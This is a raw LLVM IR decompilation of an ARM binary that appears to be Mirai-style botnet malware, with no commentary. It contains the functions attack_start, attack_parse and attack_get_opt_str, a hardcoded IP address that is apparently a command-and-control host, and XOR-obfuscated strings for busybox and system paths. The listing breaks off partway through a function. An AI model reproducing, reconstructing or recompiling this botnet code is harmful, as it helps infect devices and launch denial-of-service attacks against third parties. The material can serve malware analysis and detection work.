source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_2300c.21 = global i32 0
@global_var_d80c.25 = constant i32 -382906384
@global_var_2322c.30 = global i32 0
@global_var_831c.31 = constant i32 -352321547
@global_var_ff00.32 = constant i32 -481230794
@global_var_14284.33 = constant i32 -382909968
@global_var_a088.39 = constant i32 -382906384
@global_var_a4c0.41 = constant i32 -382906384
@global_var_89ac.43 = constant i32 -382906384
@global_var_c1dc.45 = constant i32 -382906384
@global_var_bae4.47 = constant i32 -382906384
@global_var_b330.49 = constant i32 -382906384
@global_var_9a6c.52 = constant i32 -382906384
@global_var_93d8.54 = constant i32 -382906384
@global_var_25d48.57 = global i32 0
@global_var_1a778.69 = constant i32 47
@global_var_25d50.71 = global i32 0
@global_var_23230.73 = global i32 0
@global_var_25d4c.75 = global i32 0
@global_var_c700.76 = constant i32 -352321440
@global_var_bb01.77 = constant i32 99287072
@global_var_e100.78 = constant i32 -481230848
@global_var_12220.80 = constant i32 -382910336
@global_var_d4ec.81 = constant i32 -509607932
@global_var_d6d4.83 = constant i32 -382910448
@global_var_230c0.85 = global i32 72664
@global_var_1a77c.87 = constant [15 x i8] c"209.141.53.227\00"
@global_var_25d58.90 = local_unnamed_addr global i32 0
@global_var_25d56.91 = local_unnamed_addr global i32 0
@global_var_23234.93 = global i32 0
@global_var_1a78c.101 = constant i32 10
@global_var_230bc.103 = global i32 -1
@global_var_230b8.107 = global i32 -1
@global_var_15760.109 = constant i32 -450904024
@global_var_11bd8.110 = constant i32 -382910352
@global_var_1a790.113 = constant i32 16777216
@global_var_2323c.115 = global i32 0
@global_var_23248.117 = global i32 0
@global_var_23240.119 = global i32 0
@global_var_23244.121 = global i32 0
@global_var_23280.135 = global i32 0
@global_var_2324c.137 = global i32 0
@global_var_23278.139 = global i32 0
@global_var_25d6c.143 = global i32 0
@global_var_25d64.147 = global i32 0
@global_var_25d68.149 = global i32 0
@global_var_23252.152 = local_unnamed_addr global i32 0
@global_var_23264.154 = global i32 0
@global_var_23254.156 = local_unnamed_addr global i32 0
@global_var_23258.157 = local_unnamed_addr global i32 0
@global_var_23259.158 = local_unnamed_addr global i32 0
@global_var_23272.161 = local_unnamed_addr global i32 0
@global_var_1a7a0.163 = constant [5 x i8] c"eeee\00"
@global_var_1a798.165 = constant [6 x i8] c"3!1' \00"
@global_var_1a7a8.167 = constant [6 x i8] c"efg`a\00"
@global_var_1a7b0.169 = constant [7 x i8] c"efg`ab\00"
@global_var_1a7ec.171 = constant i32 0
@global_var_1a7b8.173 = constant [5 x i8] c"!'1&\00"
@global_var_1a7c0.175 = constant [8 x i8] c"0125!8 \00"
@global_var_1a7c8.177 = constant i32 943467547
@global_var_1a7d4.179 = constant i32 322070023
@global_var_1a7e0.181 = constant [7 x i8] c"5: '8%\00"
@global_var_1a7e8.183 = constant [5 x i8] c"&;; \00"
@global_var_1a7f0.185 = constant [6 x i8] c"\22=.,\22\00"
@global_var_1a7f8.187 = constant [6 x i8] c".8,,z\00"
@global_var_1a800.189 = constant [9 x i8] c"<!: acam\00"
@global_var_1a80c.191 = constant [5 x i8] c"5:?;\00"
@global_var_1a814.193 = constant [4 x i8] c"a!$\00"
@global_var_1a818.195 = constant [7 x i8] c",7gaee\00"
@global_var_1a820.197 = constant [8 x i8] c"'!$$;& \00"
@global_var_1a828.199 = constant [7 x i8] c"93gadd\00"
@global_var_1a830.201 = constant [7 x i8] c"91&8=:\00"
@global_var_1a838.203 = constant [6 x i8] c"509=:\00"
@global_var_1a840.205 = constant [7 x i8] c"x65fg`\00"
@global_var_1a848.207 = constant [8 x i8] c"5%!5&=;\00"
@global_var_1a850.209 = constant [4 x i8] c"6=:\00"
@global_var_2325c.210 = local_unnamed_addr global i32 0
@global_var_23260.212 = local_unnamed_addr global i32 0
@global_var_2325a.213 = local_unnamed_addr global i32 0
@global_var_23274.215 = local_unnamed_addr global i32 0
@global_var_23268.216 = local_unnamed_addr global i32 0
@global_var_e1dc.222 = constant i32 -382910352
@global_var_1a854.224 = constant [3 x i8] c"\0D\0A\00"
@global_var_1a860.226 = constant i32 2096127
@global_var_1a857.228 = constant i32 2095871
@global_var_25d74.234 = global i32 0
@global_var_230c4.237 = global i32 -555811921
@global_var_1a864.242 = constant [3 x i8] c"Qm\00"
@global_var_25d7c.243 = local_unnamed_addr global i32 0
@global_var_25d80.244 = local_unnamed_addr global i32 0
@global_var_1a868.246 = constant i32 59987
@global_var_25d84.247 = local_unnamed_addr global i32 0
@global_var_25d88.248 = local_unnamed_addr global i32 0
@global_var_1a9d0.250 = constant i32 808465680
@global_var_25d90.251 = local_unnamed_addr global i32 0
@global_var_25d8c.252 = local_unnamed_addr global i32 0
@global_var_1a86c.254 = constant [7 x i8] c"'<188T\00"
@global_var_25d94.255 = local_unnamed_addr global i32 0
@global_var_25d98.256 = local_unnamed_addr global i32 0
@global_var_1a874.258 = constant [8 x i8] c"1:5681T\00"
@global_var_25d9c.259 = local_unnamed_addr global i32 0
@global_var_25da0.260 = local_unnamed_addr global i32 0
@global_var_1a87c.262 = constant [8 x i8] c"'-' 19T\00"
@global_var_25da4.263 = local_unnamed_addr global i32 0
@global_var_25da8.264 = local_unnamed_addr global i32 0
@global_var_1a884.266 = constant [4 x i8] c"'<T\00"
@global_var_25db0.267 = local_unnamed_addr global i32 0
@global_var_25dac.268 = local_unnamed_addr global i32 0
@global_var_1a888.270 = constant i32 977090171
@global_var_25db8.271 = local_unnamed_addr global i32 0
@global_var_25db4.272 = local_unnamed_addr global i32 0
@global_var_1a89c.274 = constant i32 470227742
@global_var_25dc0.275 = local_unnamed_addr global i32 0
@global_var_25dbc.276 = local_unnamed_addr global i32 0
@global_var_1a8b8.278 = constant [10 x i8] c":7;&&17 T\00"
@global_var_25dc8.279 = local_unnamed_addr global i32 0
@global_var_25dc4.280 = local_unnamed_addr global i32 0
@global_var_1a8c4.282 = constant [17 x i8] c"{6=:{6!'-6;,t$'T\00"
@global_var_25dcc.283 = local_unnamed_addr global i32 0
@global_var_25dd0.284 = local_unnamed_addr global i32 0
@global_var_1a8d8.286 = constant [23 x i8] c"{6=:{6!'-6;,t?=88tymtT\00"
@global_var_25dd8.287 = local_unnamed_addr global i32 0
@global_var_25dd4.288 = local_unnamed_addr global i32 0
@global_var_1a8f0.290 = constant [8 x i8] c"{$&;7{T\00"
@global_var_25ddc.291 = local_unnamed_addr global i32 0
@global_var_25de0.292 = local_unnamed_addr global i32 0
@global_var_1a8f8.294 = constant [6 x i8] c"{1,1T\00"
@global_var_25de4.295 = local_unnamed_addr global i32 0
@global_var_25de8.296 = local_unnamed_addr global i32 0
@global_var_1a900.298 = constant [5 x i8] c"{20T\00"
@global_var_25df0.299 = local_unnamed_addr global i32 0
@global_var_25dec.300 = local_unnamed_addr global i32 0
@global_var_1a908.302 = constant [7 x i8] c"{95$'T\00"
@global_var_25df4.303 = local_unnamed_addr global i32 0
@global_var_25df8.304 = local_unnamed_addr global i32 0
@global_var_1a910.306 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_25dfc.307 = local_unnamed_addr global i32 0
@global_var_25e00.308 = local_unnamed_addr global i32 0
@global_var_1a920.310 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_25e5c.311 = local_unnamed_addr global i32 0
@global_var_25e60.312 = local_unnamed_addr global i32 0
@global_var_1a92c.314 = constant [8 x i8] c"z5:=91T\00"
@global_var_25e64.315 = local_unnamed_addr global i32 0
@global_var_25e68.316 = local_unnamed_addr global i32 0
@global_var_1a934.318 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_25e04.319 = local_unnamed_addr global i32 0
@global_var_25e08.320 = local_unnamed_addr global i32 0
@global_var_1a948.322 = constant [9 x i8] c"5''#;&0T\00"
@global_var_25e0c.323 = local_unnamed_addr global i32 0
@global_var_25e10.324 = local_unnamed_addr global i32 0
@global_var_1a9f0.326 = constant i32 557516544
@global_var_25e18.327 = local_unnamed_addr global i32 0
@global_var_25e14.328 = local_unnamed_addr global i32 0
@global_var_1a954.330 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_25e20.331 = local_unnamed_addr global i32 0
@global_var_25e1c.332 = local_unnamed_addr global i32 0
@global_var_1a968.334 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_25e28.335 = local_unnamed_addr global i32 0
@global_var_25e24.336 = local_unnamed_addr global i32 0
@global_var_1a978.338 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_25e2c.339 = local_unnamed_addr global i32 0
@global_var_25e30.340 = local_unnamed_addr global i32 0
@global_var_1a988.342 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_25e38.343 = local_unnamed_addr global i32 0
@global_var_25e34.344 = local_unnamed_addr global i32 0
@global_var_1a99c.346 = constant [9 x i8] c"$662*7!E\00"
@global_var_25e3c.347 = local_unnamed_addr global i32 0
@global_var_25e40.348 = local_unnamed_addr global i32 0
@global_var_1a9a8.350 = constant [6 x i8] c";3=:T\00"
@global_var_25e44.351 = local_unnamed_addr global i32 0
@global_var_25e48.352 = local_unnamed_addr global i32 0
@global_var_1a9b0.354 = constant [7 x i8] c"1: 1&T\00"
@global_var_25e4c.355 = local_unnamed_addr global i32 0
@global_var_25e50.356 = local_unnamed_addr global i32 0
@global_var_1a9b8.358 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_25e54.359 = local_unnamed_addr global i32 0
@global_var_25e58.360 = local_unnamed_addr global i32 0
@global_var_23010.366 = global i32 0
@global_var_10d5c.378 = constant i32 167772282
@global_var_12578.391 = constant i32 -443088884
@global_var_10904.398 = constant i32 -481165275
@global_var_10738.407 = constant i32 -476053494
@global_var_12a0c.409 = constant i32 -456978431
@global_var_1033c.426 = constant i32 -905969623
@global_var_10274.431 = constant i32 -637534117
@global_var_ffe4.446 = constant i32 -481165217
@global_var_13244.453 = constant i32 -478871519
@global_var_13ce8.470 = constant i32 -478805983
@global_var_140d0.480 = constant i32 -382906384
@global_var_161e0.489 = constant i32 -442544040
@global_var_e898.494 = constant i32 -481230799
@global_var_14a68.514 = constant i32 -369098502
@global_var_1543c.528 = constant i32 -382910288
@global_var_155ec.540 = constant i32 -2020859901
@global_var_156d8.543 = constant i32 -494075872
@global_var_123e4.544 = constant i32 -382910336
@global_var_261f4.548 = local_unnamed_addr global i32 0
@global_var_14500.563 = constant i32 -442543860
@global_var_12970.571 = constant i32 -369093190
@global_var_166d8.597 = constant i32 -382910352
@global_var_cb90.605 = constant i32 -509607924
@global_var_17ae8.619 = constant i32 -382906384
@global_var_175a8.648 = constant i32 -382910448
@global_var_18f98.649 = constant i32 -382909968
@global_var_196d4.711 = constant i32 -481296376
@global_var_197cc.712 = constant i32 -481296376
@global_var_19850.713 = constant i32 -369098732
@global_var_2320c.11 = external global i8*
@global_var_23228.28 = external global i8*
@global_var_23229.37 = global i8 0
@global_var_25d54.89 = global i16* null
@global_var_23238.105 = external global i8*
@global_var_2327c.141 = global i16* null
@global_var_23250.151 = external global i8*
@global_var_23270.155 = local_unnamed_addr global i8 0
@global_var_23266.159 = local_unnamed_addr global i16 0
@global_var_23271.160 = local_unnamed_addr global i8 0
@global_var_23068.362 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_2320c.11 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_2320c.11 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_2320c.11, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_2300c.21, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_2300c.21 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2300c.21, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @fp, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_d80c.25 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 108392, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_81d0 = icmp eq i32 %arg1, 0
  br i1 %v2_81d0, label %dec_label_pc_8218, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %entry
  %v0_81e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81e0 = add i32 %v0_81e0, 4
  %v2_81e0 = inttoptr i32 %v1_81e0 to i8*
  %v3_81e0 = load i8, i8* %v2_81e0, align 1
  %v4_81e0 = zext i8 %v3_81e0 to i32
  %v9_81e4 = icmp eq i32 %v4_81e0, %arg3
  br i1 %v9_81e4, label %dec_label_pc_8224, label %dec_label_pc_8208.preheader

dec_label_pc_8208.preheader:                      ; preds = %dec_label_pc_81e0
  br label %dec_label_pc_8208

dec_label_pc_81f8:                                ; preds = %dec_label_pc_8208
  %v1_81f8 = add i32 %v0_8200.in, 12
  %v2_81f8 = inttoptr i32 %v1_81f8 to i8*
  %v3_81f8 = load i8, i8* %v2_81f8, align 1
  %v4_81f8 = zext i8 %v3_81f8 to i32
  %v9_81fc = icmp eq i32 %v4_81f8, %arg3
  br i1 %v9_81fc, label %dec_label_pc_8224, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_8208.preheader, %dec_label_pc_81f8
  %v0_8200.in = phi i32 [ %v0_81e0, %dec_label_pc_8208.preheader ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v0_8208 = phi i32 [ 0, %dec_label_pc_8208.preheader ], [ %v1_8208, %dec_label_pc_81f8 ]
  %v0_8200 = add i32 %v0_8200.in, 8
  %v1_8208 = add i32 %v0_8208, 1
  %v9_820c = icmp eq i32 %v1_8208, %arg1
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  br i1 %v9_820c, label %dec_label_pc_8218, label %dec_label_pc_81f8

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208, %entry, %dec_label_pc_8224
  %v0_8218 = phi i32 [ %arg4, %entry ], [ %v2_8224, %dec_label_pc_8224 ], [ %arg4, %dec_label_pc_8208 ]
  ret i32 %v0_8218

dec_label_pc_8224:                                ; preds = %dec_label_pc_81f8, %dec_label_pc_81e0
  %v0_8224 = phi i32 [ %v0_81e0, %dec_label_pc_81e0 ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v1_8224 = inttoptr i32 %v0_8224 to i32*
  %v2_8224 = load i32, i32* %v1_8224, align 4
  br label %dec_label_pc_8218

; uselistorder directives
  uselistorder i32 %v1_8208, { 1, 0 }
  uselistorder i32 %v0_8200, { 1, 0, 2 }
  uselistorder i32 %v0_8200.in, { 1, 0 }
  uselistorder i32 %v0_81e0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8208, { 1, 0 }
}

define i32 @attack_start(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_822c = load i32, i32* @r4, align 4
  store i32 %v3_822c, i32* %stack_var_-32, align 4
  %v6_822c = load i32, i32* @r5, align 4
  %v9_822c = load i32, i32* @r6, align 4
  %v12_822c = load i32, i32* @r7, align 4
  %v0_8230 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8230, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @sl, align 4
  %v4_8240 = sext i8 %arg5 to i32
  store i32 %v4_8240, i32* @r8, align 4
  %v0_8244 = call i32 @__libc_fork()
  %v7_8248 = icmp eq i32 %v0_8244, -1
  %. = zext i1 %v7_8248 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_8244, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %entry
  br label %dec_label_pc_8268

bb24:                                             ; preds = %entry
  store i32 %., i32* @r5, align 4
  %v2_8260 = icmp eq i1 %v7_8248, false
  br i1 %v2_8260, label %dec_label_pc_8270, label %dec_label_pc_8268

dec_label_pc_8268:                                ; preds = %.thread2, %bb24
  %v2_8268 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_8268, i32* @r4, align 4
  store i32 %v6_822c, i32* @r5, align 4
  store i32 %v9_822c, i32* @r6, align 4
  store i32 %v12_822c, i32* @r7, align 4
  ret i32 %v0_8244

dec_label_pc_8270:                                ; preds = %bb24
  %v0_8270 = call i32 @__libc_fork()
  %v7_8274 = icmp eq i32 %v0_8270, -1
  store i32 %v0_8270, i32* @r4, align 4
  br i1 %v7_8274, label %dec_label_pc_82a4, label %dec_label_pc_8280

dec_label_pc_8280:                                ; preds = %dec_label_pc_8270
  %v2_8280 = icmp eq i32 %v0_8270, 0
  br i1 %v2_8280, label %dec_label_pc_8288, label %dec_label_pc_82ac

dec_label_pc_8288:                                ; preds = %dec_label_pc_8280
  %v0_8288 = load i32, i32* @r6, align 4
  %v1_828c = call i32 @sleep(i32 %v0_8288)
  store i32 %v1_828c, i32* @r0, align 4
  %v0_8290 = call i32 @getppid()
  %v2_8298 = call i32 @kill(i32 %v0_8290, i32 9)
  %v0_829c = load i32, i32* @r4, align 4
  %v1_82a0 = call i32 @__GI_exit(i32 %v0_829c)
  br label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8270, %dec_label_pc_8288
  %v0_82a4 = load i32, i32* @r5, align 4
  %v1_82a8 = call i32 @__GI_exit(i32 %v0_82a4)
  br label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_8280, %dec_label_pc_82a4
  store i32 ptrtoint (i8** @global_var_23228.28 to i32), i32* %r3.global-to-local, align 4
  %v2_82b0 = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_82b0 = zext i8 %v2_82b0 to i32
  %v2_82b4 = icmp eq i8 %v2_82b0, 0
  br i1 %v2_82b4, label %dec_label_pc_82f8, label %dec_label_pc_82bc

dec_label_pc_82bc:                                ; preds = %dec_label_pc_82ac
  store i32 ptrtoint (i32* @global_var_2322c.30 to i32), i32* %r3.global-to-local, align 4
  %v2_82c0 = load i32, i32* @global_var_2322c.30, align 4
  %v1_82c4 = inttoptr i32 %v2_82c0 to i32*
  %v2_82c4 = load i32, i32* %v1_82c4, align 4
  store i32 %v2_82c4, i32* @ip, align 4
  %v1_82c8 = add i32 %v2_82c4, 4
  %v2_82c8 = inttoptr i32 %v1_82c8 to i8*
  %v3_82c8 = load i8, i8* %v2_82c8, align 1
  %v4_82c8 = zext i8 %v3_82c8 to i32
  store i32 %v4_82c8, i32* %r3.global-to-local, align 4
  %v1_82cc = load i32, i32* @r7, align 4
  %v9_82cc = icmp eq i32 %v4_82c8, %v1_82cc
  br i1 %v9_82cc, label %dec_label_pc_8300, label %dec_label_pc_82ec.preheader

dec_label_pc_82ec.preheader:                      ; preds = %dec_label_pc_82bc
  %v1_82d0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_82ec

dec_label_pc_82dc:                                ; preds = %dec_label_pc_82ec
  %v4_82dc = mul i32 %v1_82ec, 4
  %v5_82dc = add i32 %v4_82dc, %v2_82c0
  %v6_82dc = inttoptr i32 %v5_82dc to i32*
  %v7_82dc = load i32, i32* %v6_82dc, align 4
  store i32 %v7_82dc, i32* @ip, align 4
  %v1_82e0 = add i32 %v7_82dc, 4
  %v2_82e0 = inttoptr i32 %v1_82e0 to i8*
  %v3_82e0 = load i8, i8* %v2_82e0, align 1
  %v4_82e0 = zext i8 %v3_82e0 to i32
  store i32 %v4_82e0, i32* %r3.global-to-local, align 4
  %v9_82e4 = icmp eq i32 %v4_82e0, %v1_82cc
  br i1 %v9_82e4, label %dec_label_pc_8300, label %dec_label_pc_82ec

dec_label_pc_82ec:                                ; preds = %dec_label_pc_82ec.preheader, %dec_label_pc_82dc
  %v0_82ec = phi i32 [ %v1_82d0, %dec_label_pc_82ec.preheader ], [ %v1_82ec, %dec_label_pc_82dc ]
  %v1_82ec = add i32 %v0_82ec, 1
  %v9_82f0 = icmp eq i32 %v1_82ec, %v3_82b0
  br i1 %v9_82f0, label %dec_label_pc_82f8, label %dec_label_pc_82dc

dec_label_pc_82f8:                                ; preds = %dec_label_pc_82ec, %dec_label_pc_82ac, %dec_label_pc_8300
  %v1_82fc = call i32 @__GI_exit(i32 0)
  %v0_8310.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %dec_label_pc_82dc, %dec_label_pc_82bc, %dec_label_pc_82f8
  %v0_8310 = phi i32 [ %v2_82c4, %dec_label_pc_82bc ], [ %v0_8310.pre, %dec_label_pc_82f8 ], [ %v7_82dc, %dec_label_pc_82dc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_8310 = inttoptr i32 %v0_8310 to i32*
  %v2_8310 = load i32, i32* %v1_8310, align 4
  store i32 %v2_8310, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_8310)
  br label %dec_label_pc_82f8

; uselistorder directives
  uselistorder i32 %v1_82ec, { 2, 0, 1 }
  uselistorder i32 %v0_8270, { 1, 2, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_8248, { 1, 0 }
  uselistorder i32 %v0_8244, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 2, 0, 1 }
  uselistorder label %dec_label_pc_8300, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82ec, { 1, 0 }
  uselistorder label %dec_label_pc_82ac, { 1, 0 }
  uselistorder label %dec_label_pc_82a4, { 1, 0 }
  uselistorder label %dec_label_pc_8268, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_8328 = load i32, i32* @r5, align 4
  %v9_8328 = load i32, i32* @r6, align 4
  %v12_8328 = load i32, i32* @r7, align 4
  %v18_8328 = load i32, i32* @sb, align 4
  %v21_8328 = load i32, i32* @sl, align 4
  %v24_8328 = load i32, i32* @fp, align 4
  %v2_832c = icmp ugt i32 %arg2, 2
  %v7_832c = icmp eq i32 %arg2, 3
  store i1 %v7_832c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_8338 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8338, i32* @r5, align 4
  %v2_833c = xor i1 %v7_832c, true
  %v3_833c = and i1 %v2_832c, %v2_833c
  br i1 %v3_833c, label %dec_label_pc_834c, label %dec_label_pc_8340

dec_label_pc_8340:                                ; preds = %dec_label_pc_838c, %.dec_label_pc_8340_crit_edge, %dec_label_pc_8380, %dec_label_pc_8370, %dec_label_pc_834c, %entry, %dec_label_pc_8538
  %v1_8348 = phi i32 [ %v1_8348.pre, %.dec_label_pc_8340_crit_edge ], [ %v1_8350, %dec_label_pc_838c ], [ %v1_8350, %dec_label_pc_8380 ], [ %v1_8350, %dec_label_pc_8370 ], [ %v1_8350, %dec_label_pc_834c ], [ %v0_8338, %entry ], [ %v0_853c, %dec_label_pc_8538 ]
  store i32 %v6_8328, i32* @r5, align 4
  store i32 %v9_8328, i32* @r6, align 4
  store i32 %v12_8328, i32* @r7, align 4
  store i32 %v18_8328, i32* @sb, align 4
  store i32 %v21_8328, i32* @sl, align 4
  store i32 %v24_8328, i32* @fp, align 4
  ret i32 %v1_8348

dec_label_pc_834c:                                ; preds = %entry
  %v1_834c = inttoptr i32 %v0_8338 to i32*
  %v2_834c = load i32, i32* %v1_834c, align 4
  store i32 %v2_834c, i32* %r1.global-to-local, align 4
  %v1_8350 = and i32 %v2_834c, 16711680
  store i32 %v1_8350, i32* %r0.global-to-local, align 4
  %v3_8354 = udiv i32 %v2_834c, 16777216
  %v4_8358 = udiv i32 %v1_8350, 256
  %v5_8358 = or i32 %v4_8358, %v3_8354
  %v1_835c = and i32 %v2_834c, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_835c, i32* %r2.global-to-local, align 4
  %v4_8360 = mul i32 %v1_835c, 256
  %v5_8360 = or i32 %v5_8358, %v4_8360
  store i32 %v5_8360, i32* %r3.global-to-local, align 4
  %v7_8364 = icmp eq i32 %arg2, 4
  store i1 %v7_8364, i1* %cpsr_z.global-to-local, align 1
  %v4_8368 = mul i32 %v2_834c, 16777216
  %v5_8368 = or i32 %v5_8360, %v4_8368
  store i32 %v5_8368, i32* @fp, align 4
  br i1 %v7_8364, label %dec_label_pc_8340, label %dec_label_pc_8370

dec_label_pc_8370:                                ; preds = %dec_label_pc_834c
  %v1_8370 = add i32 %v0_8338, 4
  %v2_8370 = inttoptr i32 %v1_8370 to i8*
  %v3_8370 = load i8, i8* %v2_8370, align 1
  %v4_8370 = zext i8 %v3_8370 to i32
  store i32 %v4_8370, i32* %r2.global-to-local, align 4
  %v7_8374 = icmp eq i32 %arg2, 5
  store i1 %v7_8374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8374, label %dec_label_pc_8340, label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8370
  %v1_8380 = add i32 %v0_8338, 5
  %v2_8380 = inttoptr i32 %v1_8380 to i8*
  %v3_8380 = load i8, i8* %v2_8380, align 1
  %v4_8380 = zext i8 %v3_8380 to i32
  store i32 %v4_8380, i32* @sb, align 4
  %v2_8384 = icmp eq i8 %v3_8380, 0
  store i1 %v2_8384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8384, label %dec_label_pc_8340, label %dec_label_pc_838c

dec_label_pc_838c:                                ; preds = %dec_label_pc_8380
  %v2_8390 = mul nuw nsw i32 %v4_8380, 5
  store i32 %v2_8390, i32* @r7, align 4
  %v1_8394 = add i32 %arg2, -6
  store i32 %v1_8394, i32* %r3.global-to-local, align 4
